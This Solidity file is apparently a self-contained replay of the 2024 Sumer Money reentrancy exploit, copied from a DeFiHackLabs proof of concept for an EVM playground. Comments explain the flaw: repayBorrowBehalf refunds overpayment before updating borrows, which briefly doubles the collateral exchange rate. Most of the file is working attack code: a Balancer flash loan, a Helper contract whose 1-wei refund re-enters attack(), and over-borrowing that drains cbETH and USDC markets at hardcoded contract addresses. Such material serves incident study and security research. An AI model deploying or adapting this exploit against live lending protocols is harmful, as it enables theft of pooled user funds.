// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2024-04-SumerMoney).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (SumerMoney is itself `Test`, `attacker = address(this)`, and the Balancer
// flash-loan callback `receiveFlashLoan` plus the reentrant `attack()` both
// live on the test contract). There is no standalone attack contract to
// deploy, so this file is a faithful, self-contained copy of that inline
// attack (testExploit -> receiveFlashLoan -> Helper.borrow -> reentrant
// attack()) with no imports, so it compiles anywhere. Logic and constants are
// copied verbatim from test/SumerMoney_exp.sol.
//
// Root cause: Sumer Money's CEther.repayBorrowBehalf refunds any overpayment
// via `msg.sender.call{value: ...}('')` BEFORE repayBorrowBehalfInternal runs.
// That callback re-enters while sdrETH's cash is inflated by the just-repaid
// borrow but totalBorrows has not yet been decremented, so
// exchangeRate = (cash + totalBorrows - reserves) / totalSupply briefly
// doubles. The attacker's freshly-minted sdrETH collateral is priced at 2x
// during the window, letting it over-borrow cbETH/USDC from the other markets
// and cheaply redeem its own ETH back.

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
}

interface IWETH is IERC20 {
    function withdraw(uint256 wad) external;
    function deposit() external payable;
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface crETH {
    function exchangeRateCurrent() external returns (uint256);
    function mint() external payable;
    function borrow(uint256 borrowAmount) external returns (uint256);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
    function repayBorrowBehalf(address borrower) external payable;
}

interface ICErc20Delegate {
    function borrow(uint256 borrowAmount) external returns (uint256);
    function mint(uint256 mintAmount) external returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
}

interface IClaimer {
    function claim(uint256[] calldata tokenIds) external;
}

contract SumerMoneyDrain {
    IBalancerVault constant Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IWETH constant WETH = IWETH(payable(address(0x4200000000000000000000000000000000000006)));
    IERC20 constant USDC = IERC20(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);
    IERC20 constant cbETH = IERC20(0x2Ae3F1Ec7F1F5012CFEab0185bfc7aa3cf0DEc22);
    crETH constant sdrETH = crETH(payable(address(0x7b5969bB51fa3B002579D7ee41A454AC691716DC)));
    ICErc20Delegate constant sdrUSDC = ICErc20Delegate(0x142017b52c99d3dFe55E49d79Df0bAF7F4478c0c);
    ICErc20Delegate constant sdrcbETH = ICErc20Delegate(0x6345aF6dA3EBd9DF468e37B473128Fd3079C4a4b);
    IClaimer constant claimer = IClaimer(0x549D0CdC753601fbE29f9DE186868429a8558E07);

    Helper helper;

    // entrypoint (mirrors testExploit)
    function run() external {
        address[] memory tokens = new address[](2);
        tokens[0] = address(WETH);
        tokens[1] = address(USDC);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 150 ether;
        amounts[1] = 645_000 * 1e6;
        bytes memory userData = "";
        Balancer.flashLoan(address(this), tokens, amounts, userData);
    }

    // Balancer flash-loan callback (mirrors receiveFlashLoan)
    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        WETH.withdraw(amounts[0]);

        sdrETH.mint{value: amounts[0]}();

        helper = new Helper{value: 1}();
        USDC.transfer(address(helper), amounts[1]);
        helper.borrow(amounts[1]);

        WETH.deposit{value: amounts[0]}();

        WETH.transfer(address(Balancer), amounts[0]);
        USDC.transfer(address(Balancer), amounts[1]);
    }

    // reentrant callback, triggered by Helper.receive() during repayBorrowBehalf
    // (mirrors attack())
    function attack() external {
        // exchangeRate == getCashPrior() + totalBorrows - totalReserves / totalSupply
        // In repayBorrowBehalf(), getCashPrior() increases by 150.36 ether but
        // totalBorrows is not decreased yet because we are re-entering.
        sdrcbETH.borrow(cbETH.balanceOf(address(sdrcbETH)));
        sdrUSDC.borrow(USDC.balanceOf(address(sdrUSDC)) - 645_000 * 1e6);
        sdrETH.redeemUnderlying(150 ether);
        uint256[] memory tokenIds = new uint256[](2);
        tokenIds[0] = 309;
        tokenIds[1] = 310;
        claimer.claim(tokenIds);
    }

    receive() external payable {}
}

contract Helper {
    address owner;
    IWETH constant WETH = IWETH(payable(address(0x4200000000000000000000000000000000000006)));
    IERC20 constant USDC = IERC20(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);
    IERC20 constant cbETH = IERC20(0x2Ae3F1Ec7F1F5012CFEab0185bfc7aa3cf0DEc22);
    crETH constant sdrETH = crETH(payable(address(0x7b5969bB51fa3B002579D7ee41A454AC691716DC)));
    ICErc20Delegate constant sdrUSDC = ICErc20Delegate(0x142017b52c99d3dFe55E49d79Df0bAF7F4478c0c);
    ICErc20Delegate constant sdrcbETH = ICErc20Delegate(0x6345aF6dA3EBd9DF468e37B473128Fd3079C4a4b);
    IClaimer constant claimer = IClaimer(0x549D0CdC753601fbE29f9DE186868429a8558E07);

    constructor() payable {
        owner = msg.sender;
    }

    function borrow(uint256 amount) external {
        USDC.approve(address(sdrUSDC), amount);
        sdrUSDC.mint(amount);

        uint256 borrowAmount = address(sdrETH).balance;
        sdrETH.borrow(borrowAmount);

        // ⚠️ reentrancy: repayBorrowBehalf refunds the 1-wei overpayment via a
        // raw call to msg.sender (this Helper) BEFORE updating totalBorrows.
        sdrETH.repayBorrowBehalf{value: borrowAmount + 1}(address(this));

        sdrUSDC.redeem(sdrUSDC.balanceOf(address(this)));
        uint256[] memory tokenIds = new uint256[](1);
        tokenIds[0] = 311;
        claimer.claim(tokenIds);
        USDC.transfer(owner, USDC.balanceOf(address(this)));
    }

    receive() external payable {
        if (msg.value == 1) {
            owner.call(abi.encodeWithSignature("attack()"));
        }
    }
}
